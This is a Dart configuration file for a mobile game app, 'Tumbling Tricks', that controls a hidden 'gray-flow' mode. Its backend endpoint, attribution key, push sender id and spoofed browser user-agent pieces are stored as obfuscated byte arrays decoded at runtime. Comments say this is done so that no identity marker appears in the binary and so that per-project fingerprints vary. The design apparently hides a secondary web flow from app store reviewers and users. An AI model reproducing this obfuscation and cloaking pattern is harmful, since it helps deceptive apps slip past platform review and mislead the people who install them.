import '../core/spool_cipher.dart';

/// Central backstage (gray-flow) configuration for Tumbling Tricks.
///
/// Sensitive values (config endpoint, attribution key, sender id, browser-agent
/// fragments) live as encoded byte arrays produced by
/// `dart run tool/encode_ring_values.dart`. Public values (privacy / support
/// URLs) are kept as plain constants on purpose — encrypting a URL that is
/// already public in App Store Connect only advertises decoder infrastructure.
abstract final class MarqueeConfig {
  // ── App identity ─────────────────────────────────────────────────────────
  static const String appTitle = 'Tumbling Tricks';
  static const String bundleId = 'com.tumblingtricks.tricksgame';

  /// iOS App Store numeric id (used for GCD lookups and the `store_id` field).
  static const String iosStoreId = '6797948134';

  // ── Timing constants (rotated per project — non-round on purpose) ─────────
  static const int pushSnoozeSeconds = 302400; // 3.5 days
  static const int organicRecheckSeconds = 8;
  static const Duration configTimeout = Duration(seconds: 18);
  static const Duration firstInstallWait = Duration(seconds: 9);
  static const Duration returningInstallWait = Duration(seconds: 6);
  static const Duration deepLinkWait = Duration(seconds: 6);
  static const int attPromptDelayMs = 480;
  static const int redirectRetryLimit = 2;
  static const int postLoadResizeMs = 1100;
  static const int coldViewportSettleMs = 220;
  static const List<int> reflowDelaysMs = <int>[60, 210, 380, 640, 980];
  static const int savedUrlMaxAgeDays = 7;

  // ── Public URLs (NOT encoded — declared verbatim in App Store Connect) ────
  static const String privacyUrl = 'https://tumblingtricks.com/privacy-policy.html';
  static const String supportUrl = 'https://tumblingtricks.com/support.html';

  // ── Encoded secrets (from tool/encode_ring_values.dart) ──────────────────
  static const List<int> _endpoint = <int>[
    246, 12, 212, 13, 26, 193, 131, 210, 241, 146, 168, 43, 207, 247, 194, 105,
    47, 50, 217, 163, 192, 148, 144, 163, 71, 196, 232, 3, 99, 57, 183, 185,
    228, 245, 255, 4, 0,
  ];
  static const List<int> _gcd = <int>[
    246, 12, 212, 13, 26, 193, 131, 210, 226, 132, 161, 58, 199, 245, 130, 111,
    43, 48, 195, 166, 199, 158, 219, 178, 6, 202, 168, 13, 35, 62, 191, 163,
    247, 186, 227, 0, 47, 150, 245, 115, 5, 194, 147, 51, 90, 3, 233,
  ];
  static const List<int> _appsFlyerKey = <int>[
    206, 31, 203, 44, 91, 195, 234, 147, 242, 142, 163, 5, 201, 204, 205, 88,
    48, 22, 228, 246, 251, 210,
  ];
  static const List<int> _firebaseProject = <int>[
    169, 76, 153, 73, 81, 204, 156, 203, 181, 211, 253,
  ];
  static const List<int> _oneLinkHost = <int>[
    234, 13, 205, 31, 5, 146, 194, 154, 241, 149, 172, 42, 200, 237, 130, 97,
    53, 37, 220, 169, 197, 140, 144, 173, 77,
  ];

  // ── Browser-agent fragments (assembled at runtime) ───────────────────────
  static const List<int> _uaProduct = <int>[
    211, 23, 218, 20, 5, 151, 205, 210, 176, 201, 245,
  ];
  static const List<int> _uaPlatformPrefix = <int>[
    182, 17, 240, 21, 6, 149, 201, 198, 165, 164, 149, 28, 131, 247, 252, 102,
    52, 46, 213, 224, 228, 180,
  ];
  static const List<int> _uaPlatformSuffix = <int>[
    242, 17, 203, 24, 73, 182, 205, 158, 165, 168, 150, 105, 251, 183,
  ];
  static const List<int> _uaEngine = <int>[
    223, 8, 208, 17, 12, 172, 201, 159, 206, 142, 177, 102, 149, 174, 153, 32,
    106, 110, 129, 245, 139, 207, 245, 136, 124, 228, 139, 76, 44, 59, 184, 187,
    230, 251, 200, 9, 19, 153, 251, 46,
  ];
  static const List<int> _uaMobileToken = <int>[
    211, 23, 194, 20, 5, 158, 131, 204, 176, 162, 244, 125, 155,
  ];
  static const List<int> _uaSafariFallback = <int>[175, 64, 142, 75];
  static const List<int> _uaSafariTail = <int>[168, 72, 148, 83, 88];

  // Partner identity suffix tokens — encoded so no plaintext identity marker
  // literal ships in the binary. See browser_agent.dart.
  static const List<int> _uaIdentityId = <int>[255, 8, 208, 20, 13, 212, 197, 153];
  static const List<int> _uaIdentityName = <int>[255, 8, 208, 19, 8, 150, 201, 210];
  static const List<int> _uaAppName = <int>[
    202, 13, 205, 31, 5, 146, 194, 154, 209, 149, 172, 42, 200, 237,
  ];

  // ── Decoded accessors ────────────────────────────────────────────────────
  static String get endpoint => unspool(_endpoint);
  static String get gcdBase => unspool(_gcd);
  static String get appsFlyerKey => unspool(_appsFlyerKey);
  static String get firebaseProjectNumber => unspool(_firebaseProject);
  static String get oneLinkHost => unspool(_oneLinkHost);

  static String get uaProduct => unspool(_uaProduct);
  static String get uaPlatformPrefix => unspool(_uaPlatformPrefix);
  static String get uaPlatformSuffix => unspool(_uaPlatformSuffix);
  static String get uaEngine => unspool(_uaEngine);
  static String get uaMobileToken => unspool(_uaMobileToken);
  static String get uaSafariFallback => unspool(_uaSafariFallback);
  static String get uaSafariTail => unspool(_uaSafariTail);
  static String get uaIdentityId => unspool(_uaIdentityId);
  static String get uaIdentityName => unspool(_uaIdentityName);
  static String get uaAppName => unspool(_uaAppName);

  static String get storeToken => 'id$iosStoreId';

  /// Gray flow only runs when the backend + attribution + push sender id are
  /// all present. OneLink is intentionally excluded — it is optional and a
  /// missing OneLink must never disable the whole flow.
  static bool get gateReady =>
      endpoint.isNotEmpty &&
      appsFlyerKey.isNotEmpty &&
      firebaseProjectNumber.isNotEmpty;
}
